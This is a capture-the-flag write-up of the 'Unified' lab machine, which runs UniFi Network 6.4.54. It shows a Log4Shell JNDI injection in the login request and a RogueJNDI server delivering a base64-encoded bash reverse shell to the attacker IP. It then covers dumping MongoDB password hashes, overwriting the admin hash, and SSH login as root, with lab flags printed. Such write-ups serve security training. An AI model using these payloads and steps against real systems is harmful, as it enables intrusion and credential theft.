
## CTF Writeup: Unified

---
## Reconnaissance

An initial scan revealed the following information about running services on the target server.

```
nmap -n -Pn -sSCV -p- -oN nmap.txt 10.129.46.248
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-17 07:47 -0500
Nmap scan report for 10.129.46.248
Host is up (0.021s latency).
Not shown: 65529 closed tcp ports (reset)
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
6789/tcp open  ibm-db2-admin?
8080/tcp open  http            Apache Tomcat (language: en)
|_http-title: Did not follow redirect to https://10.129.46.248:8443/manage
|_http-open-proxy: Proxy might be redirecting requests
8443/tcp open  ssl/nagios-nsca Nagios NSCA
| http-title: UniFi Network
|_Requested resource was /manage/account/login?redirect=%2Fmanage
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=UniFi/organizationName=Ubiquiti Inc./stateOrProvinceName=New York/countryName=US
| Subject Alternative Name: DNS:UniFi
| Not valid before: 2021-12-30T21:37:24
|_Not valid after:  2024-04-03T21:37:24
8843/tcp open  ssl/http        Apache Tomcat (language: en)
|_http-title: HTTP Status 400 \xE2\x80\x93 Bad Request
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=UniFi/organizationName=Ubiquiti Inc./stateOrProvinceName=New York/countryName=US
| Subject Alternative Name: DNS:UniFi
| Not valid before: 2021-12-30T21:37:24
|_Not valid after:  2024-04-03T21:37:24
8880/tcp open  http            Apache Tomcat (language: en)
|_http-title: HTTP Status 400 \xE2\x80\x93 Bad Request
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 196.16 seconds
```

There seems to be multiple servers in-place. Multiple http and https webservers including tomcat instances and an interesting port on 6789. Which isn't reachable for us.

Proceeded with starting inspecting the http service on port 8080. This immediatly redirected us to the port 8443. Which seems to be an login panel for "UniFi Network 6.4.54".

Googled for public exploits "unifi 6.4.54 exploit" & found that the target seems to be vulnerable to CVE-2021-44228, which represents Unauthenticated Remote Code Execution.

Utilized the following exploit from GitHub.

```
git clone https://github.com/kozmer/log4j-shell-poc.git
```

Created Virtual Environment.

```
python3 -m venv myenv
source myenv/bin/activate
```

Installed dependecies.

```
pip install -r requirements.txt
```

We need the java jdk for version 8 aswell.

```
wget https://github.com/dcm2406/openjdk-8u20/raw/master/jdk-8u20-linux-x64.tar.gz
```

Decompressed the .tar archive.

```
tar -xvf jdk-8u20-linux-x64.tar.gz
```

Opened up BurpSuite, so I can intercept the network package.

```
POST /api/login HTTP/1.1
Host: 10.129.46.248:8443
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://10.129.46.248:8443/manage/account/login?redirect=%2Fmanage
Content-Type: application/json; charset=utf-8
Content-Length: 100
Origin: https://10.129.46.248:8443
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers
Connection: keep-alive

{
"username":"dwqdwq",
"password":"qdwwdq",
"remember":"${jndi:ldap://10.10.14.44/test}",
"strict":true
}
```

After sending the package the server responded with an 400 server response, but we were still able to capture the ldap connection in our listener tool.

```
tcpdump -i tun0 port 389
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
09:07:49.834099 IP 10.129.46.248.33332 > 10.10.14.44.ldap: Flags [S], seq 845053400, win 64240, options [mss 1362,sackOK,TS val 2441175508 ecr 0,nop,wscale 7], length 0
09:07:49.834186 IP 10.10.14.44.ldap > 10.129.46.248.33332: Flags [R.], seq 0, ack 845053401, win 0, length 0
```

Installed compatible java version & maven.

```
sudo apt install openjdk-11-jdk
sudo apt-get install maven
```

Downloaded Java Rogue Server for our attack, previously we utilized tcpdump for analysis. But this time we'll use RogueJNDI, a malicious LDAP Server for JNDI Injection Attacks.

Cloned the repository and use Maven to compile the source code.

```
git clone https://github.com/veracode-research/rogue-jndi
cd rogue-jndi 
mvn package
```

Let's create an payload which our rogue server will send back to the target server.

```
echo "bash -c 'bash -i >& /dev/tcp/10.10.14.44/1337 0>&1'" | base64             
YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40NC8xMzM3IDA+JjEnCg==
```

Started up netcat listener on port 1337.

```
nc -lvnp 1337
```

Started up our rogue server with an preset command.

```
java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40NC8xMzM3IDA+JjEnCg==}|{base64,-d}|{bash,-i}" --hostname "10.10.14.44"
+-+-+-+-+-+-+-+-+-+
|R|o|g|u|e|J|n|d|i|
+-+-+-+-+-+-+-+-+-+
Starting HTTP server on 0.0.0.0:8000
Starting LDAP server on 0.0.0.0:1389
Mapping ldap://10.10.14.44:1389/o=tomcat to artsploit.controllers.Tomcat
Mapping ldap://10.10.14.44:1389/o=groovy to artsploit.controllers.Groovy
Mapping ldap://10.10.14.44:1389/o=websphere1 to artsploit.controllers.WebSphere1
Mapping ldap://10.10.14.44:1389/o=websphere1,wsdl=* to artsploit.controllers.WebSphere1
Mapping ldap://10.10.14.44:1389/o=websphere2 to artsploit.controllers.WebSphere2
Mapping ldap://10.10.14.44:1389/o=websphere2,jar=* to artsploit.controllers.WebSphere2
Mapping ldap://10.10.14.44:1389/ to artsploit.controllers.RemoteReference
Mapping ldap://10.10.14.44:1389/o=reference to artsploit.controllers.RemoteReference
```

We see a lot of services which our Rogue Server can interact with. We need to find the one used by UniFi, but the nmap scan already hints at tomcat!

After utilizing the payload & sending the network package with the following call to our Rogue Server. The Rogue Server accepts the connection & tells the target server to execute our set command (the bash reverse shell 1 liner).

```
“${jndi:ldap://10.10.14.44:1389/o=tomcat}”,
```

Gained RCE.

```
nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.14.44] from (UNKNOWN) [10.129.46.248] 48470
bash: cannot set terminal process group (8): Inappropriate ioctl for device
bash: no job control in this shell
unifi@unified:/usr/lib/unifi$
```

Retrieved user.txt in /home/michael directory.

```
6ced1a6a89e666c0620cdb10262ba127
```

## Privilege Escalation

Enumerated running processes.

```
ps -aux
```

Identified an running MongoDB Database running internally on port 27117.

Utilized the following queries to enumerate MongoDB Databases.

```
mongo --port 27117 --eval "db.adminCommand('listDatabases')"
```

We'll utilize the following functions to enumerate admin credentials.

```
mongo --port 27117 ace --eval “db.admin.find().forEach(printjson);”
```

Dump the whole database:

```
mongo --port 27117 ace --eval "db.getCollectionNames().forEach(function(c) { print('=== ' + c + ' ==='); db[c].find().forEach(printjson); })"
```

This revealed encrypted credentials for many users:

```
administrator:$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.
```

```
michael:$6$spHwHYVF$mF/VQrMNGSau0IP7LjqQMfF5VjZBph6VUf4clW3SULqBjDNQwW.BlIqsafYbLWmKRhfWTiZLjhSP.D/M1h5yJ0
```

Let's save those credentials onto our local machine & try to decrypt the password. Bruteforcing an password was unsuccessful!

```
hashcat -m 1800 hash /usr/share/wordlists/rockyou.txt
```

Updated admin credentials to "Password1234".

```
mongo --port 27117 ace --eval 'db.admin.updateOne({"_id": ObjectId("61ce278f46e0fb0012d47ee4")}, { $set: { "x_shadow": "Password1234" } })'
```

Now because the original password is stored in a hashed SHA-512, we must rewrite it with the same format.

```
mkpasswd -m sha-512 Password1234
$6$UBC.G7B5S1jXFZf9$4Tbf/yz3/mTdi4DG5vqYESwyBNNB91pOqo0MjuKCpFNmYoc1KGZgPVsP2vZ6yxNF27sR5vxzKjnrRdr.jzyJ9/
```

Now rewrite the encoded original password aswell.

```
mongo --port 27117 ace --eval 'db.admin.updateOne({ "_id": ObjectId("61ce278f46e0fb0012d47ee4") }, { $set: { "x_shadow": "$6$UBC.G7B5S1jXFZf9$4Tbf/yz3/mTdi4DG5vqYESwyBNNB91pOqo0MjuKCpFNmYoc1KGZgPVsP2vZ6yxNF27sR5vxzKjnrRdr.jzyJ9/" } })'
```

Now we should be able to access the UniFi Login Panel.

Successfully logged into the UniFi Network!

Changed password of user michael:

```
michael:password123!
```

Retrieved root's credentials in Settings > Site

```
root:NotACrackablePassword4U2022
```

Connected to the target server.

```
ssh root@10.129.46.248
```

Retrieved root.txt in /root directory.

```
e50bc93c75b634e4b272d2f771c33681
```